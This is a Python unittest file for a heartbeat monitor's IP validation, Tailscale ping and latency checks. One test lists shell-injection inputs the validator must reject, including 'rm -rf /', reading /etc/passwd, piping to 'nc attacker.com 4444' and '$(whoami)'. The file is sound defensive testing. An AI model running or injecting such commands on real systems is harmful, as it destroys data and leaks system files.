# Copyright 2026 espressolee
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
"""
Comprehensive tests for substrate/heartbeat.py - HeartbeatMonitor
Target: 80%+ coverage
"""

import unittest
from unittest.mock import MagicMock, patch

from warm_logic.kernel.substrate.heartbeat import (
    HeartbeatMonitor,
    _validate_ip_address,
    check_tailscale,
)


class TestValidateIpAddress(unittest.TestCase):
    """Test IP address validation (SEC-005)."""

    def test_valid_ipv4(self):
        """Test valid IPv4 addresses."""
        self.assertTrue(_validate_ip_address("127.0.0.1"))
        self.assertTrue(_validate_ip_address("192.168.1.1"))
        self.assertTrue(_validate_ip_address("10.0.0.1"))
        self.assertTrue(_validate_ip_address("255.255.255.255"))

    def test_valid_ipv6(self):
        """Test valid IPv6 addresses."""
        self.assertTrue(_validate_ip_address("::1"))
        self.assertTrue(_validate_ip_address("fe80::1"))
        self.assertTrue(_validate_ip_address("2001:db8::1"))

    def test_empty_ip(self):
        """Test empty IP returns False."""
        self.assertFalse(_validate_ip_address(""))
        self.assertFalse(_validate_ip_address(None))

    def test_shell_metacharacters_rejected(self):
        """Test shell metacharacters are rejected (SEC-005)."""
        malicious_inputs = [
            "127.0.0.1; rm -rf /",
            "127.0.0.1 && cat /etc/passwd",
            "127.0.0.1 | nc attacker.com 4444",
            "$(whoami)",
            "`id`",
            "127.0.0.1\necho pwned",
            "127.0.0.1'--",
            '127.0.0.1"--',
            "127.0.0.1\\x00",
        ]
        for inp in malicious_inputs:
            self.assertFalse(_validate_ip_address(inp), f"Should reject: {repr(inp)}")

    def test_invalid_ip_format(self):
        """Test invalid IP formats."""
        self.assertFalse(_validate_ip_address("not.an.ip"))
        self.assertFalse(_validate_ip_address("256.256.256.256"))
        self.assertFalse(_validate_ip_address("hostname"))
        self.assertFalse(_validate_ip_address("192.168.1"))


class TestCheckTailscale(unittest.TestCase):
    """Test Tailscale connectivity check."""

    @patch("warm_logic.kernel.substrate.heartbeat.subprocess.run")
    def test_check_tailscale_success(self, mock_run):
        """Test successful ping."""
        mock_run.return_value = MagicMock(returncode=0)
        self.assertTrue(check_tailscale())

    @patch("warm_logic.kernel.substrate.heartbeat.subprocess.run")
    def test_check_tailscale_failure(self, mock_run):
        """Test failed ping."""
        mock_run.return_value = MagicMock(returncode=1)
        self.assertFalse(check_tailscale())

    @patch("warm_logic.kernel.substrate.heartbeat.subprocess.run")
    def test_check_tailscale_exception(self, mock_run):
        """Test exception handling."""
        mock_run.side_effect = Exception("Network error")
        self.assertFalse(check_tailscale())


class TestHeartbeatMonitor(unittest.TestCase):
    """Test HeartbeatMonitor class."""

    def test_init_valid_ip(self):
        """Test initialization with valid IP."""
        monitor = HeartbeatMonitor(target_ip="192.168.1.1")
        self.assertEqual(monitor.target_ip, "192.168.1.1")
        self.assertFalse(monitor.running)

    def test_init_invalid_ip_falls_back(self):
        """Test initialization with invalid IP falls back to localhost."""
        monitor = HeartbeatMonitor(target_ip="malicious; rm -rf")
        self.assertEqual(monitor.target_ip, "127.0.0.1")

    def test_init_default_ip(self):
        """Test default initialization."""
        monitor = HeartbeatMonitor()
        # Should use validated TAILSCALE_TARGET or fallback
        self.assertIsNotNone(monitor.target_ip)

    @patch("warm_logic.kernel.substrate.heartbeat.check_tailscale")
    def test_is_alive_true(self, mock_check):
        """Test is_alive when mesh is reachable."""
        mock_check.return_value = True
        monitor = HeartbeatMonitor(target_ip="127.0.0.1")
        self.assertTrue(monitor.is_alive())

    @patch("warm_logic.kernel.substrate.heartbeat.check_tailscale")
    def test_is_alive_false(self, mock_check):
        """Test is_alive when mesh is unreachable."""
        mock_check.return_value = False
        monitor = HeartbeatMonitor(target_ip="127.0.0.1")
        self.assertFalse(monitor.is_alive())

    def test_start(self):
        """Test start method."""
        monitor = HeartbeatMonitor(target_ip="127.0.0.1")
        self.assertFalse(monitor.running)
        monitor.start()
        self.assertTrue(monitor.running)


class TestHeartbeatLatency(unittest.TestCase):
    """Test latency measurement."""

    @patch("warm_logic.kernel.substrate.heartbeat.subprocess.run")
    def test_check_latency_success_parsed(self, mock_run):
        """Test latency check with parsed output."""
        mock_run.return_value = MagicMock(
            returncode=0,
            stdout="64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=12.345 ms",
        )
        monitor = HeartbeatMonitor(target_ip="127.0.0.1")
        latency = monitor.check_tailscale_latency()
        self.assertAlmostEqual(latency, 12.345, places=2)

    @patch("warm_logic.kernel.substrate.heartbeat.subprocess.run")
    def test_check_latency_fallback_timing(self, mock_run):
        """Test latency fallback to wall-clock timing."""
        mock_run.return_value = MagicMock(
            returncode=0,
            stdout="PING output without time=",
        )
        monitor = HeartbeatMonitor(target_ip="127.0.0.1")
        latency = monitor.check_tailscale_latency()
        # Should return positive value from wall-clock
        self.assertGreaterEqual(latency, 0)

    @patch("warm_logic.kernel.substrate.heartbeat.subprocess.run")
    def test_check_latency_unreachable(self, mock_run):
        """Test latency when unreachable."""
        mock_run.return_value = MagicMock(returncode=1, stdout="")
        monitor = HeartbeatMonitor(target_ip="127.0.0.1")
        latency = monitor.check_tailscale_latency()
        self.assertEqual(latency, -1.0)

    @patch("warm_logic.kernel.substrate.heartbeat.subprocess.run")
    def test_check_latency_exception(self, mock_run):
        """Test latency on exception."""
        mock_run.side_effect = Exception("Network error")
        monitor = HeartbeatMonitor(target_ip="127.0.0.1")
        latency = monitor.check_tailscale_latency()
        self.assertEqual(latency, -1.0)


class TestHeartbeatPulse(unittest.TestCase):
    """Test pulse method."""

    @patch.object(HeartbeatMonitor, "check_tailscale_latency")
    def test_pulse_offline(self, mock_latency):
        """Test pulse when target is offline."""
        mock_latency.return_value = -1.0
        monitor = HeartbeatMonitor(target_ip="127.0.0.1")
        # Should not raise
        monitor.pulse()

    @patch.object(HeartbeatMonitor, "check_tailscale_latency")
    @patch("warm_logic.kernel.substrate.heartbeat.CrossNodeAttestation")
    def test_pulse_online_attested(self, mock_attestor_class, mock_latency):
        """Test pulse when online and attested."""
        mock_latency.return_value = 50.0  # Normal latency
        mock_attestor = MagicMock()
        mock_attestor.challenge_tower.return_value = True
        mock_attestor_class.return_value = mock_attestor

        monitor = HeartbeatMonitor(target_ip="127.0.0.1")
        monitor.attestor = mock_attestor
        monitor.pulse()

        mock_attestor.challenge_tower.assert_called_once()

    @patch.object(HeartbeatMonitor, "check_tailscale_latency")
    @patch("warm_logic.kernel.substrate.heartbeat.CrossNodeAttestation")
    def test_pulse_online_not_attested(self, mock_attestor_class, mock_latency):
        """Test pulse when online but attestation fails."""
        mock_latency.return_value = 100.0
        mock_attestor = MagicMock()
        mock_attestor.challenge_tower.return_value = False
        mock_attestor_class.return_value = mock_attestor

        monitor = HeartbeatMonitor(target_ip="127.0.0.1")
        monitor.attestor = mock_attestor
        monitor.pulse()

        mock_attestor.challenge_tower.assert_called_once()

    @patch.object(HeartbeatMonitor, "check_tailscale_latency")
    @patch("warm_logic.kernel.substrate.heartbeat.CrossNodeAttestation")
    def test_pulse_high_latency_warning(self, mock_attestor_class, mock_latency):
        """Test pulse with high latency triggers warning."""
        mock_latency.return_value = 500.0  # High latency > 300ms
        mock_attestor = MagicMock()
        mock_attestor.challenge_tower.return_value = True
        mock_attestor_class.return_value = mock_attestor

        monitor = HeartbeatMonitor(target_ip="127.0.0.1")
        monitor.attestor = mock_attestor
        # Should log warning but not raise
        monitor.pulse()


if __name__ == "__main__":
    unittest.main()
